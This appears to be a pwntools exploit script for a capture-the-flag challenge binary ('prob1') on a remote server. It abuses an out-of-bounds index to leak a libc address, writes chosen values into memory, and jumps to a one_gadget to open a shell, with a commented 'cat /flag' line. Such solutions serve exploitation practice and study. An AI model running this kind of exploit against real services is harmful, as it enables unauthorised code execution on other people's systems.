from pwn import *

def show():
    r.recvuntil("> ")
    r.sendline('1')
def rank(title,rank):
    r.recvuntil("> ")
    r.sendline('2')
    r.recvuntil("> ")
    r.sendline(str(title))
    r.recvuntil("> ")
    r.sendline(str(rank))

#r = process("./prob1")
r = remote("143.248.249.153", 4016)
rank(0,-263020)
show()
read = u64(r.recvuntil("\n")[3:9]+"\x00\x00")
print hex(read)
libc = read - 0x10cf70
one_gadget = libc + 0x106ef8
log.info("read: %#x",read)
log.info("libc: %#x",libc)
log.info("one_gadget: %#x",one_gadget)
rank(0x11,0x400980)
rank(0x12,0x602100)
r.recvuntil("> ")
r.sendline('3'+'A'*7+p64(one_gadget))
#r.sendline("cat /flag")
r.interactive()
